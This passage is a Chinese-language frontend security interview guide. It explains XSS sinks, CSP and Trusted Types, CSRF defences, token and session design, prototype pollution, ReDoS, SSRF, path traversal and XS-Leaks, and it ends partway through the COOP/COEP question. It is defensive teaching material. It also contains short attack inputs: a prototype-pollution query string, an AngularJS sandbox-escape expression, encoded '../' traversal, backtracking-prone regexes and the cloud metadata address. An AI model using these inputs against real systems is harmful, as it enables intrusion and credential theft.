## 一、XSS 深入

### Q1. DOM XSS 的「源」和「汇」是什么？

- **难度**: 中级
- **标签**: XSS, DOM

**答案**

**DOM XSS = 不可信的数据从「源」流向「汇」**。

**源（Source）**：攻击者可以控制的数据。

- `location`（`hash`、`search`、`pathname`）、`document.referrer`、`window.name`
- `postMessage` 的数据
- `localStorage` / `sessionStorage`（如果曾被写入不可信的数据）
- 接口返回的用户生成内容

**汇（Sink）**：会把字符串当作代码或 HTML 处理的 API。

| 类别 | 汇 |
|------|-----|
| HTML | `innerHTML`、`outerHTML`、`insertAdjacentHTML`、`document.write`、`DOMParser` 后插入、`Range.createContextualFragment` |
| JS 执行 | `eval`、`new Function`、`setTimeout(字符串)`、`setInterval(字符串)` |
| URL | `location.href = ...`、`a.href`、`iframe.src`、`window.open`（`javascript:` 协议） |
| 脚本 | `script.src`、`script.textContent` |
| 框架 | `dangerouslySetInnerHTML`、`v-html`、jQuery 的 `$(html)`、`.html()` |

**防御**：

- 使用安全的 API（`textContent`、`setAttribute` 设置非事件属性）
- URL 汇校验协议
- **Trusted Types** 在汇处强制使用经过策略处理的值（Q5）

**口述模板（30–60 秒）**

1. 一句话结论：DOM XSS 是不可信的数据从源流向会执行代码的汇。
2. 关键机制：源包括 location、postMessage、存储；汇包括 innerHTML、eval、location.href 等。
3. 对比或注意点：URL 类的汇要校验 javascript: 协议。
4. 可追问时补充：Trusted Types 在汇处强制检查，从根本上防止 DOM XSS。

**常见追问**

- 怎么在代码审查中发现 DOM XSS？→ 搜索所有的汇（ESLint 插件如 `eslint-plugin-no-unsanitized`），追溯数据来源。

### Q2. React 和 Vue 已经自动转义了，为什么还会有 XSS？

- **难度**: 中级
- **标签**: XSS, 框架

**答案**

框架的插值（`{value}`、`{{ value }}`）会转义 HTML，但以下场景仍然有风险：

| 场景 | 例子 | 防御 |
|------|------|------|
| **显式插入 HTML** | `dangerouslySetInnerHTML`、`v-html` | DOMPurify 清洗 |
| **URL 属性** | `<a href={userUrl}>`，值为 `javascript:...` | 校验协议（React 19 会阻止 `javascript:` URL，但不要依赖） |
| **SSR 状态注入** | 服务端把数据序列化到 `<script>` 中：`window.__STATE__ = ${JSON.stringify(data)}`，数据中包含 `</script>` | 使用安全的序列化（转义 `<`、`>`、`/`、`\u2028`），如 `serialize-javascript`、`devalue` |
| 动态属性展开 | `<div {...userProps}>` 中包含 `dangerouslySetInnerHTML` 或事件属性 | 不要展开不可信的对象 |
| 直接操作 DOM | ref 后使用 `innerHTML` | 同 DOM XSS |
| 第三方组件 | Markdown 渲染器、富文本编辑器的配置 | 关闭原始 HTML 或配置清洗 |
| **Vue 模板编译** | 把用户输入作为模板编译（`template: userInput`） | 永远不要编译不可信的模板 |
| 样式注入 | `style` 中插入不可信的 URL | 校验 |

**口述模板（30–60 秒）**

1. 一句话结论：框架只转义插值，显式插入 HTML、URL 属性、SSR 状态注入等仍然有风险。
2. 关键机制：dangerouslySetInnerHTML 和 v-html 需要用 DOMPurify 清洗。
3. 对比或注意点：href 中的 javascript: 协议需要校验；SSR 序列化数据时要转义。
4. 可追问时补充：永远不要把用户输入作为 Vue 模板编译。

**常见追问**

- SSR 中 `JSON.stringify` 为什么不安全？→ 它不转义 `</script>`，数据中的这个字符串会提前结束脚本标签，后面的内容被当作 HTML 解析。

### Q3. 富文本内容怎么安全地展示？

- **难度**: 中级
- **标签**: XSS, 富文本

**答案**

**原则**：使用**白名单**清洗，不要使用正则或黑名单。

```ts
import DOMPurify from 'dompurify'

const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br', 'img', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title'],
  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
})
```

**要点**：

- **在哪里清洗**：服务端存储时清洗（防止其他客户端未清洗）+ 前端渲染时再清洗（纵深防御）；清洗库要使用与浏览器解析一致的实现（DOMPurify 在浏览器中使用浏览器自身的解析器，服务端使用 jsdom）
- 链接加上 `rel="noopener noreferrer"`，外链可以加 `target="_blank"`
- 图片：限制来源或通过代理（防止跟踪和内网探测）
- **及时升级清洗库**：曾出现过利用解析差异（mXSS）绕过的漏洞
- **Sanitizer API**：浏览器内置的 HTML 清洗（`element.setHTML()`），正在推进标准化和实现（以 MDN 兼容表为准）
- 更安全的替代：使用 Markdown 或结构化格式（JSON 文档树）存储，渲染时生成 DOM，不接受原始 HTML

**口述模板（30–60 秒）**

1. 一句话结论：富文本必须用白名单清洗库（如 DOMPurify），不要用正则。
2. 关键机制：限制允许的标签、属性和 URL 协议。
3. 对比或注意点：服务端存储时和前端渲染时都清洗，及时升级清洗库。
4. 可追问时补充：更安全的方式是存储结构化格式，不接受原始 HTML；浏览器在推进内置的 Sanitizer API。

**常见追问**

- 什么是 mXSS？→ 变异型 XSS：清洗后的 HTML 在被浏览器再次解析时结构发生变化，产生了可执行的内容；所以清洗后的结果不要再进行字符串处理或二次解析。

## 二、CSP 与 Trusted Types

### Q4. 为什么推荐 nonce + strict-dynamic，而不是域名白名单？

- **难度**: 中级
- **标签**: CSP

**答案**

**域名白名单的问题**：

```http
script-src 'self' https://cdn.jsdelivr.net https://www.google.com
```

- 白名单中的域名上如果有 **JSONP 接口**或托管了**可被滥用的旧版本库**（例如旧版 AngularJS），攻击者可以利用它们执行任意代码
- 研究表明大多数基于白名单的 CSP 可以被绕过
- 白名单难以维护

**nonce + strict-dynamic**：

```http
script-src 'nonce-r4nd0m' 'strict-dynamic' https: 'unsafe-inline';
object-src 'none';
base-uri 'none';
```

- 只有带正确 nonce 的脚本可以执行（攻击者无法预测每次请求的随机值）
- `'strict-dynamic'`：被信任的脚本通过 `createElement('script')` 加载的脚本也被信任 → 兼容打包工具和加载器
- **向后兼容**：支持 `strict-dynamic` 的浏览器会忽略 `https:` 和 `'unsafe-inline'`；旧浏览器回退到这两项

**静态页面**：无法每次生成 nonce → 使用**哈希**（`'sha256-...'`）列出允许的内联脚本，配合 `strict-dynamic`。

**口述模板（30–60 秒）**

1. 一句话结论：域名白名单容易被白名单中的 JSONP 接口或旧版库绕过，nonce 更可靠。
2. 关键机制：只有带正确随机 nonce 的脚本才能执行，strict-dynamic 让它加载的脚本也被信任。
3. 对比或注意点：加上 https: 和 unsafe-inline 作为旧浏览器的回退，新浏览器会忽略它们。
4. 可追问时补充：静态页面使用哈希代替 nonce。

**常见追问**

- 使用了 nonce 的页面能被 CDN 缓存吗？→ 不能直接缓存（每次 nonce 不同），需要在边缘注入 nonce，或者使用哈希方案。

### Q5. Trusted Types 是什么？怎么使用？

- **难度**: 中级
- **标签**: Trusted Types, XSS

**答案**

**Trusted Types**：让 DOM XSS 的汇（`innerHTML`、`script.src`、`eval` 等）**只接受经过策略处理的「可信类型」对象**，不接受普通字符串。

**开启**：

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types app-policy dompurify
```

**创建策略**：

```ts
const policy = trustedTypes.createPolicy('app-policy', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (input) => {
    const url = new URL(input, location.origin)
    if (url.origin === location.origin) return url.toString()
    throw new TypeError('不允许的脚本地址')
  },
})

element.innerHTML = policy.createHTML(userContent)  // 通过
element.innerHTML = userContent                     // 抛出 TypeError
```

**价值**：

- 把安全审查从「所有使用汇的地方」（可能成百上千处）缩小到「少数几个策略」
- 违规时可以上报，配合 Report-Only 逐步迁移
- 框架支持：Angular 原生支持；React、Vue 的大部分代码不直接使用字符串汇，`dangerouslySetInnerHTML` 需要传入 TrustedHTML

**兼容性**：Chromium 早已支持，其他浏览器在逐步实现（以 MDN 为准）；不支持的浏览器可以使用 polyfill 或仅作为增强。

**口述模板（30–60 秒）**

1. 一句话结论：Trusted Types 让危险的 DOM 汇只接受经过策略处理的可信对象。
2. 关键机制：通过 CSP 开启，用 createPolicy 定义清洗或校验逻辑。
3. 对比或注意点：把安全审查从所有调用点缩小到少数几个策略。
4. 可追问时补充：先用 Report-Only 收集违规，逐步迁移。

**常见追问**

- 第三方库直接使用了 `innerHTML` 怎么办？→ 定义名为 `default` 的策略，作为兜底处理未经策略处理的字符串（并上报），逐步推动库的修改。

### Q6. CSP 违规报告怎么收集？怎么灰度上线？

- **难度**: 中级
- **标签**: CSP, 监控

**答案**

**报告配置**：

```http
Reporting-Endpoints: csp="https://example.com/csp-reports"
Content-Security-Policy-Report-Only: script-src 'nonce-xxx' 'strict-dynamic'; object-src 'none'; base-uri 'none'; report-to csp
```

- `report-to`（新）配合 `Reporting-Endpoints`；`report-uri`（旧）仍然被广泛支持，可以同时设置
- 报告包含：违规的指令、被阻止的地址、页面地址、源文件和行号、代码片段（`'report-sample'`）

**灰度上线流程**：

```text
1. Report-Only 模式部署，收集一到两周的报告
2. 分析报告：区分自己的代码、第三方脚本、浏览器扩展的噪音
3. 修复：内联脚本加 nonce、移除内联事件处理器（onclick）、替换 eval
4. 按页面或按用户比例切换为强制模式，同时保留 Report-Only 的更严格策略
5. 持续监控报告的数量变化，异常增长可能是攻击或新代码引入的问题
```

**噪音**：浏览器扩展注入的脚本会产生大量报告 → 按来源（`chrome-extension://` 等）过滤、聚合去重。

**口述模板（30–60 秒）**

1. 一句话结论：先用 Report-Only 模式收集违规报告，修复后再按比例切换为强制模式。
2. 关键机制：report-to 配合 Reporting-Endpoints 上报违规的指令、地址和代码位置。
3. 对比或注意点：浏览器扩展会产生大量噪音，需要过滤和聚合。
4. 可追问时补充：强制模式上线后持续监控，报告异常增长可能是攻击。

**常见追问**

- 内联事件处理器（`onclick="..."`）在严格 CSP 下怎么办？→ 改为 `addEventListener`；CSP 中的 nonce 对内联事件处理器无效。

## 三、CSRF 与令牌

### Q7. SameSite=Lax 是否就可以不需要 CSRF Token 了？

- **难度**: 中级
- **标签**: CSRF, Cookie

**答案**

**SameSite 按「站点」判断**（注册域名 + 协议），不是「源」：

- `a.example.com` 和 `b.example.com` 是**同站**
- 所以同站的子域名之间的请求会带上 Cookie

**Lax 不能防御的场景**：

| 场景 | 说明 |
|------|------|
| **同站的子域名被攻破**（XSS、子域名接管） | 从同站发起的请求带 Cookie |
| **用 GET 修改数据** | Lax 允许顶级导航的 GET 请求携带 Cookie |
| 兼容性和旧浏览器 | 未设置 SameSite 的 Cookie 在部分浏览器中的默认行为不同 |
| Chrome 的「Lax + POST」宽限 | 新设置的未指定 SameSite 的 Cookie 在 2 分钟内允许顶级 POST（兼容 SSO） |
| 用户主动显式设置了 `SameSite=None` | 某些场景（跨站嵌入）必须这样设置 |

**推荐**：

- 显式设置 `SameSite=Lax` 或 `Strict`
- 修改数据只使用 POST / PUT / DELETE
- **加上 Origin 校验**（几乎没有成本）
- 高风险操作或存在子域名风险时，使用 CSRF Token
- 使用 `__Host-` 前缀的 Cookie，防止子域名覆盖

**口述模板（30–60 秒）**

1. 一句话结论：SameSite=Lax 防御了大部分 CSRF，但不能完全替代 Token。
2. 关键机制：SameSite 按站点判断，同站的子域名请求会带 Cookie。
3. 对比或注意点：子域名被攻破、用 GET 修改数据时 Lax 无法防御。
4. 可追问时补充：推荐 Lax 加 Origin 校验，高风险场景加 CSRF Token。

**常见追问**

- 什么是子域名接管？→ 子域名的 DNS 记录指向已经释放的云资源（例如删除的对象存储桶），攻击者重新申请该资源，从而控制这个子域名。

### Q8. CSRF Token 有哪些实现方式？

- **难度**: 中级
- **标签**: CSRF

**答案**

| 方式 | 原理 | 说明 |
|------|------|------|
| **同步令牌** | 服务端在会话中存储令牌，页面中嵌入，请求时校验 | 最经典，需要服务端状态 |
| **双重提交 Cookie** | 令牌同时放在 Cookie 和请求头中，服务端比较两者 | 无状态；**必须签名**（HMAC 绑定会话），否则子域名可以写入 Cookie 绕过 |
| **自定义请求头** | 要求请求带有 `X-Requested-With` 等头，跨站请求无法添加（会触发 CORS 预检） | 只适用于 AJAX 接口，依赖 CORS 配置正确 |
| **Fetch Metadata** | 检查 `Sec-Fetch-Site` 头，拒绝 `cross-site` 的修改请求 | 浏览器自动添加且不可伪造，现代浏览器普遍支持 |

**Fetch Metadata 资源隔离策略**：

```ts
function isAllowed(req: Request): boolean {
  const site = req.headers.get('sec-fetch-site')
  if (!site) return true                                  // 旧浏览器，依赖其他防御
  if (site === 'same-origin' || site === 'same-site' || site === 'none') return true
  // 跨站请求只允许顶级导航的 GET
  return req.method === 'GET' && req.headers.get('sec-fetch-mode') === 'navigate'
}
```

**口述模板（30–60 秒）**

1. 一句话结论：CSRF Token 有同步令牌、双重提交 Cookie、自定义头和 Fetch Metadata 几种方式。
2. 关键机制：同步令牌在服务端存储，双重提交比较 Cookie 和请求头。
3. 对比或注意点：双重提交必须签名并绑定会话，否则可以被子域名绕过。
4. 可追问时补充：Fetch Metadata 的 Sec-Fetch-Site 由浏览器添加，不可伪造，是低成本的防御。

**常见追问**

- 单页应用怎么获取 CSRF Token？→ 页面加载时通过接口或 meta 标签获取，之后在请求头中携带；或者使用签名的双重提交 Cookie（Cookie 不设 HttpOnly，前端读取后放入请求头）。

### Q9. 访问令牌和刷新令牌怎么设计？什么是刷新令牌轮换？

- **难度**: 中级
- **标签**: 令牌, 认证

**答案**

| 令牌 | 有效期 | 存储 | 用途 |
|------|--------|------|------|
| 访问令牌 | 短（5–15 分钟） | 内存 | 调用 API |
| 刷新令牌 | 长（数天到数周） | **HttpOnly Cookie**（Path 限定为刷新接口） | 获取新的访问令牌 |

**刷新令牌轮换**：

- 每次使用刷新令牌时，返回**新的**刷新令牌，旧的作废
- **重用检测**：如果一个已经作废的刷新令牌被再次使用，说明令牌可能被窃取 → **吊销整个令牌家族**，要求重新登录

```text
正常：RT1 → 刷新 → 得到 RT2（RT1 作废）→ 刷新 → 得到 RT3 ...
被盗：攻击者用 RT1 刷新得到 RT2' → 用户用 RT1 刷新 → 发现 RT1 已被使用 → 吊销所有
```

**前端注意**：

- 并发请求同时遇到过期时**只刷新一次**（单飞，见[网络手写题 H6](../network/40-coding-handwritten.md)）—— 否则轮换机制会把并发刷新误判为重用
- 多个标签页之间协调刷新（`BroadcastChannel` 或 Web Locks API）

**口述模板（30–60 秒）**

1. 一句话结论：访问令牌短期、放内存；刷新令牌长期、放 HttpOnly Cookie。
2. 关键机制：刷新令牌轮换每次返回新令牌，旧令牌被重用时吊销整个令牌家族。
3. 对比或注意点：前端要单飞刷新，否则并发刷新会被误判为重用。
4. 可追问时补充：多标签页用 Web Locks 或 BroadcastChannel 协调刷新。

**常见追问**

- 网络不稳定导致刷新请求成功了但客户端没收到响应，会怎样？→ 客户端用旧令牌重试会触发重用检测；服务端可以设置一个很短的宽限期，允许旧令牌在几秒内返回相同的新令牌。

### Q10. SPA 中实现 OAuth 登录为什么推荐 BFF 模式？

- **难度**: 中级
- **标签**: OAuth, BFF

**答案**

**SPA 直接作为 OAuth 客户端**（授权码 + PKCE，令牌在浏览器中）：

- 令牌在 JS 可以访问的地方 → XSS 可以窃取
- SPA 是公开客户端，没有客户端密钥
- 刷新令牌在浏览器中更难保护

**BFF（Backend for Frontend）模式**：

```text
浏览器 ←（HttpOnly 会话 Cookie）→ BFF（机密客户端，持有令牌）←（访问令牌）→ API
1. 用户点击登录 → BFF 发起授权码 + PKCE 流程
2. 回调到 BFF → BFF 用授权码 + 客户端密钥换取令牌，保存在服务端会话中
3. 浏览器只拿到 HttpOnly、SameSite 的会话 Cookie
4. 浏览器调用 BFF → BFF 附加访问令牌转发给 API，负责刷新
```

**优点**：令牌**从不出现在浏览器中**；BFF 是机密客户端；刷新逻辑在服务端。

**代价**：需要服务端组件；需要防御 CSRF（使用 Cookie）。

IETF 的「OAuth 2.0 for Browser-Based Apps」最佳实践推荐 BFF 作为最安全的方案。

**口述模板（30–60 秒）**

1. 一句话结论：BFF 模式让令牌保存在服务端，浏览器只持有 HttpOnly 的会话 Cookie。
2. 关键机制：BFF 作为机密客户端完成授权码流程，代理 API 请求并负责刷新。
3. 对比或注意点：SPA 直接持有令牌时，XSS 可以窃取令牌。
4. 可追问时补充：代价是需要服务端组件和 CSRF 防御；这是 IETF 推荐的最安全方案。

**常见追问**

- Next.js / Nuxt 应用是不是天然适合 BFF？→ 是的，它们的服务端部分可以直接作为 BFF，令牌保存在服务端会话中。

### Q11. OIDC 是什么？ID Token 和 Access Token 有什么区别？

- **难度**: 中级
- **标签**: OIDC, 认证

**答案**

**OIDC（OpenID Connect）**：在 OAuth 2.0 之上的**认证**层，告诉客户端「用户是谁」。

| 对比项 | ID Token | Access Token |
|--------|----------|--------------|
| 用途 | 给**客户端**看：用户的身份 | 给**资源服务器（API）**看：授权访问 |
| 格式 | 必须是 JWT | 可以是 JWT 或不透明字符串 |
| 受众（`aud`） | 客户端 ID | API |
| 包含 | `sub`、`iss`、`aud`、`exp`、`nonce`、用户信息 | 权限范围（scope） |

**常见错误**：

- **用 ID Token 调用 API**（受众不对）
- **用 Access Token 判断用户身份**（它不是为客户端设计的）
- 不校验 ID Token 的 `iss`、`aud`、`exp`、签名、`nonce`

**`nonce`**：客户端在授权请求中发送随机值，ID Token 中返回，客户端校验 → 防止 ID Token 被重放。

**口述模板（30–60 秒）**

1. 一句话结论：OIDC 在 OAuth 之上增加了认证，通过 ID Token 告诉客户端用户是谁。
2. 关键机制：ID Token 给客户端看，Access Token 给 API 看。
3. 对比或注意点：不要用 ID Token 调用 API，也不要用 Access Token 判断身份。
4. 可追问时补充：nonce 防止 ID Token 被重放，必须校验签名、签发者、受众和过期时间。

**常见追问**

- 「使用微信 / Google 登录」用的是 OAuth 还是 OIDC？→ Google 等支持标准 OIDC；部分国内平台是基于 OAuth 2.0 的私有扩展（通过接口获取用户信息），概念类似。

### Q12. Passkeys / WebAuthn 的注册和登录流程是什么？

- **难度**: 中级
- **标签**: Passkeys, WebAuthn

**答案**

**注册**：

```text
1. 服务端生成随机挑战，返回注册选项（rp.id = 域名、用户信息、挑战、算法）
2. 前端调用 navigator.credentials.create({ publicKey: options })
3. 用户验证（指纹 / 面部 / PIN），设备生成密钥对，私钥保存在设备或同步到密码管理器
4. 返回公钥、凭证 ID、签名的认证数据
5. 服务端校验挑战、来源（origin）、rp.id，保存公钥和凭证 ID
```

**登录**：

```text
1. 服务端生成挑战
2. 前端调用 navigator.credentials.get({ publicKey: { challenge, rpId, ... } })
3. 用户验证，设备用私钥对（挑战 + 来源 + 认证数据）签名
4. 服务端用保存的公钥验证签名，校验挑战、来源、签名计数器
```

**为什么抗钓鱼**：

- 凭证绑定 `rp.id`（域名），浏览器**只允许**在该域名（或其子域名）下使用
- 签名中包含浏览器提供的 `origin`，服务端校验
- 用户无法把凭证「交给」钓鱼网站

**体验**：条件式 UI（`mediation: 'conditional'`，在用户名输入框的自动填充中显示 Passkey）；保留密码或其他方式作为过渡。

**口述模板（30–60 秒）**

1. 一句话结论：注册时设备生成密钥对并把公钥交给服务端，登录时设备用私钥对服务端的挑战签名。
2. 关键机制：凭证绑定域名，签名中包含来源，服务端校验。
3. 对比或注意点：钓鱼网站的域名不同，浏览器不会提供凭证，所以能抗钓鱼。
4. 可追问时补充：条件式 UI 让 Passkey 出现在自动填充中，提升体验。

**常见追问**

- 挑战为什么必须由服务端生成且一次性？→ 防止重放：签名是对挑战的签名，挑战被重用时攻击者可以重放旧的签名。

### Q13. 什么是会话固定？会话管理有哪些要点？

- **难度**: 中级
- **标签**: 会话

**答案**

**会话固定**：攻击者让受害者使用攻击者已知的会话 ID（例如通过子域名设置 Cookie、URL 中的会话 ID），受害者登录后，攻击者用同一个会话 ID 获得登录状态。

**防御**：**登录后重新生成会话 ID**（权限变化时都要重新生成）。

**会话管理要点**：

| 方面 | 要点 |
|------|------|
| 会话 ID | 足够长的随机值（至少 128 位熵）；不放在 URL 中 |
| Cookie | `__Host-`、`HttpOnly`、`Secure`、`SameSite` |
| 生命周期 | 空闲超时 + 绝对超时；敏感操作要求重新认证 |
| 登出 | **服务端销毁会话**，不只是删除客户端 Cookie |
| 权限变化 | 登录、提权、修改密码时重新生成会话 ID；修改密码后使其他会话失效 |
| 并发会话 | 用户可以查看和撤销其他设备的会话 |
| 异常检测 | IP、设备变化时提示或要求验证 |

**口述模板（30–60 秒）**

1. 一句话结论：会话固定是让受害者使用攻击者已知的会话 ID，登录后攻击者获得登录状态。
2. 关键机制：防御是登录和权限变化时重新生成会话 ID。
3. 对比或注意点：登出时要在服务端销毁会话，不只是删除 Cookie。
4. 可追问时补充：设置空闲和绝对超时，修改密码后让其他会话失效。

**常见追问**

- JWT 无状态，登出怎么实现？→ 删除客户端的令牌 + 服务端吊销列表（记录到过期为止）或令牌版本号；短有效期减少风险窗口。

## 四、其他注入类漏洞

### Q14. 什么是原型污染？怎么防御？

- **难度**: 中级
- **标签**: 原型污染

**答案**

**原理**：通过 `__proto__`、`constructor.prototype` 等键修改 `Object.prototype`，影响**所有对象**。

**常见入口**：

- 深合并 / 深拷贝函数（`merge(target, JSON.parse(userInput))`）
- 按路径设置属性（`set(obj, 'a.b.c', value)`，路径来自用户）
- 解析查询字符串为嵌套对象（`?__proto__[isAdmin]=true`）

**危害**：

- 绕过逻辑判断（`if (user.isAdmin)`，user 本身没有该属性时读到原型上的值）
- 前端：污染某些库读取的配置选项 → DOM XSS（「原型污染 gadget」）
- 服务端（Node.js）：拒绝服务，甚至配合特定库的 gadget 远程执行代码

**防御**：

| 措施 | 说明 |
|------|------|
| 合并 / 设置时**跳过危险键** | `__proto__`、`constructor`、`prototype` |
| 只合并**自有属性** | `Object.hasOwn` |
| 使用无原型的对象 | `Object.create(null)` 作为字典 |
| 使用 `Map` | 存储用户提供的键值 |
| 冻结原型 | `Object.freeze(Object.prototype)`（可能影响第三方库，需要测试） |
| Schema 校验 | 只接受预期的键 |
| 升级依赖 | lodash 等旧版本存在原型污染漏洞 |
| Node.js | `--disable-proto=delete` 移除 `__proto__` 访问器 |

**口述模板（30–60 秒）**

1. 一句话结论：原型污染是通过 __proto__ 等键修改 Object.prototype，影响所有对象。
2. 关键机制：常见入口是深合并、按路径设置属性、解析嵌套的查询字符串。
3. 对比或注意点：可以导致逻辑绕过、DOM XSS，服务端可能导致拒绝服务甚至远程执行。
4. 可追问时补充：防御是跳过危险键、使用 Map 或无原型对象、schema 校验。

**常见追问**

- `JSON.parse('{"__proto__": {"x": 1}}')` 会污染原型吗？→ 不会，`JSON.parse` 把 `__proto__` 作为普通的自有属性创建；但之后把这个对象传给不安全的合并函数时，合并函数中的赋值会触发污染。

### Q15. 什么是 ReDoS？

- **难度**: 中级
- **标签**: ReDoS

**答案**

**ReDoS（正则表达式拒绝服务）**：回溯型正则引擎在某些输入下需要**指数级**的时间匹配。

**危险模式**：嵌套量词或重叠的选择分支：

```ts
/^(a+)+$/
/^(\w+\s?)*$/
/(a|aa)+$/
```

输入 `'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'` 时，引擎尝试所有拆分方式。

**影响**：

- **Node.js 服务端**：单线程，一个请求的正则卡住整个进程 → 所有请求超时
- 前端：页面卡死

**防御**：

- 避免嵌套量词；用工具检测（`safe-regex`、`eslint-plugin-regexp`、`recheck`）
- **限制输入长度**（最简单有效）
- 使用线性时间的正则引擎（`re2`）处理用户提供的正则或复杂匹配
- 依赖中的 ReDoS 漏洞（例如旧版 `semver`、`ua-parser`）及时升级
- 关键路径设置超时或在 Worker 中执行

**口述模板（30–60 秒）**

1. 一句话结论：ReDoS 是回溯型正则在特定输入下需要指数级时间，导致拒绝服务。
2. 关键机制：嵌套量词和重叠的分支会产生大量回溯。
3. 对比或注意点：在 Node.js 中一个请求就可以卡住整个进程。
4. 可追问时补充：限制输入长度、用工具检测、必要时使用 re2 这类线性时间引擎。

**常见追问**

- 允许用户输入正则表达式（例如搜索功能）怎么办？→ 使用 re2 等线性时间引擎，或者在 Worker 中执行并设置超时。

### Q16. 什么是 SSRF？前端工程师什么时候会遇到？

- **难度**: 中级
- **标签**: SSRF

**答案**

**SSRF（服务端请求伪造）**：服务端根据用户提供的 URL 发起请求，攻击者让服务端访问**内网**资源。

**前端工程师遇到的场景**（SSR、BFF、Node.js 服务）：

- 链接预览、抓取网页标题和图片
- 图片代理、图片优化（Next.js `next/image` 的远程图片）
- Webhook 回调地址
- 导入 URL（从链接导入文件）
- 服务端生成 PDF / 截图（无头浏览器访问用户提供的 URL）

**风险**：访问云厂商的**元数据服务**（`169.254.169.254`，获取云凭证）、内网管理后台、数据库、Redis。

**防御**：

| 措施 | 说明 |
|------|------|
| 协议白名单 | 只允许 `http:` / `https:` |
| 域名白名单（最好） | 只允许特定的域名 |
| **解析后检查 IP** | 拒绝私有地址、回环、链路本地、元数据地址（包括 IPv6 和各种编码形式） |
| **防止 DNS 重绑定** | 检查时解析的 IP 和连接时使用的 IP 必须相同 → 用检查过的 IP 建立连接 |
| **重定向** | 每一跳都要重新检查，或者禁用重定向 |
| 网络隔离 | 抓取服务部署在隔离的网络中，无法访问内网 |
| 云元数据 | 使用 IMDSv2（需要令牌）等加固 |
| 响应 | 限制大小、超时、不把原始错误返回给用户 |

**口述模板（30–60 秒）**

1. 一句话结论：SSRF 是服务端根据用户提供的 URL 发起请求，被利用访问内网资源。
2. 关键机制：前端在 SSR、BFF、链接预览、图片代理中会遇到。
3. 对比或注意点：只检查域名不够，要解析后检查 IP，并防止 DNS 重绑定和重定向绕过。
4. 可追问时补充：最可靠的是网络隔离，让抓取服务无法访问内网。

**常见追问**

- 什么是 DNS 重绑定？→ 域名第一次解析返回公网 IP 通过检查，第二次（实际连接时）解析返回内网 IP；防御是用检查过的 IP 直接连接。

### Q17. 路径遍历和模板注入是什么？

- **难度**: 中级
- **标签**: 注入, Node.js

**答案**

**路径遍历**：用户提供的文件名包含 `../`，访问到预期目录之外的文件。

```ts
import path from 'node:path'

const ROOT = path.resolve('uploads')

function safeResolve(userPath: string): string {
  const resolved = path.resolve(ROOT, userPath)
  // 规范化后必须仍然在根目录之内
  if (resolved !== ROOT && !resolved.startsWith(ROOT + path.sep)) {
    throw new Error('非法路径')
  }
  return resolved
}
```

注意：URL 编码（`%2e%2e%2f`）、Windows 的反斜杠、空字节；最好使用 ID 映射而不是文件名。

**服务端模板注入（SSTI）**：把用户输入作为**模板**而不是模板的**数据**编译。

```ts
// 危险：用户输入成为模板的一部分
const html = ejs.render(`<h1>你好 ${userInput}</h1>`)
// 安全：用户输入作为数据
const html = ejs.render('<h1>你好 <%= name %></h1>', { name: userInput })
```

前端对应的问题：Vue 编译用户提供的模板、Angular 的表达式注入（`{{constructor.constructor(...)()}}`，旧版 AngularJS 的沙箱逃逸）。

**口述模板（30–60 秒）**

1. 一句话结论：路径遍历是文件名中的 ../ 访问到目录之外的文件，模板注入是用户输入被作为模板编译。
2. 关键机制：路径要规范化后检查是否仍在根目录内；用户输入只能作为模板的数据。
3. 对比或注意点：注意 URL 编码和不同系统的路径分隔符。
4. 可追问时补充：前端对应的风险是编译用户提供的 Vue 模板或 AngularJS 表达式注入。

**常见追问**

- 为什么推荐用 ID 映射而不是文件名？→ 用户只传 ID，服务端从数据库查找实际的存储路径，用户输入不会参与路径的构造。

## 五、跨源隔离与侧信道

### Q18. 什么是 XS-Leaks？怎么防御？

- **难度**: 中级
- **标签**: XS-Leaks

**答案**

**XS-Leaks（跨站泄露）**：利用浏览器的侧信道，从其他站点**推断**用户的信息（不能直接读取内容，但可以得到「是 / 否」的答案）。

**常见手段（概念）**：

- **窗口引用**：打开目标页面后，通过 `window.length`（iframe 数量）、是否发生跳转推断状态
- **加载事件和错误**：资源是否加载成功（`onload` / `onerror`）→ 用户是否登录、是否有权限
- **时序**：响应时间的差异 → 搜索结果是否为空
- **缓存探测**：资源是否在缓存中 → 用户是否访问过某个页面

**例子**：判断用户是否登录了某个网站、某个搜索是否有结果（泄露邮件、聊天的内容）。

**防御**：

| 措施 | 作用 |
|------|------|
| **SameSite Cookie** | 跨站请求不带 Cookie，返回未登录的统一结果 |
| **Fetch Metadata** | 服务端拒绝不合理的跨站请求（例如跨站的 iframe 加载敏感页面） |
| `Cross-Origin-Opener-Policy: same-origin` | 切断与攻击者窗口的引用 |
| `Cross-Origin-Resource-Policy` | 禁止资源被跨站加载 |
| `frame-ancestors` / X-Frame-Options | 禁止被嵌入 |
| 缓存分区 | 浏览器已按顶级站点分区 HTTP 缓存 |

**口述模板（30–60 秒）**

1. 一句话结论：XS-Leaks 利用浏览器的侧信道推断用户在其他站点的信息。
2. 关键机制：通过窗口引用、加载事件、时序、缓存等获取「是或否」的答案。
3. 对比或注意点：不能直接读取内容，但可以泄露登录状态、搜索结果是否为空。
4. 可追问时补充：防御组合是 SameSite、Fetch Metadata、COOP、CORP 和 frame-ancestors。

**常见追问**

- 浏览器做了哪些缓解？→ HTTP 缓存按顶级站点分区、第三方 Cookie 限制、站点隔离（进程级别）。

### Q19. COOP、COEP、CORP 分别是什么？

- **难度**: 中级
- **标签**: 跨源隔离

**答案**

| 头部 | 作用 | 常用值 |
|------|------|--------|
| **COOP**（Cross-Origin-Opener-Policy） | 控制与跨源窗口的引用关系（`window.opener`） | `same-origin`：跨源打开的窗口放在不同的浏览上下文组，互相拿不到引用 |
| **COEP**（Cross-Origin-Embedder-Policy） | 要求页面加载的所有跨源资源都明确允许被嵌入 | `require-corp` 或 `credentialless` |
| **CORP**（Cross-Origin-Resource-Policy） | 资源声明自己可以被谁加载 | `same-origin`、`same-site`、`cross-origin` |

**跨源隔离**：同时设置 `COOP: same-origin` 和 `COEP: require-corp` → `crossOriginIsolated === true` → 可以使用 `SharedArrayBuffer`、高精度计时器（这些 API 可能被 Spectre 类攻击利用）。

**安全收益**（即使不需要跨源隔离）：

- COOP 防止通过 `window.opener` 进行的攻击（标签页劫持）和部分 XS-Leaks
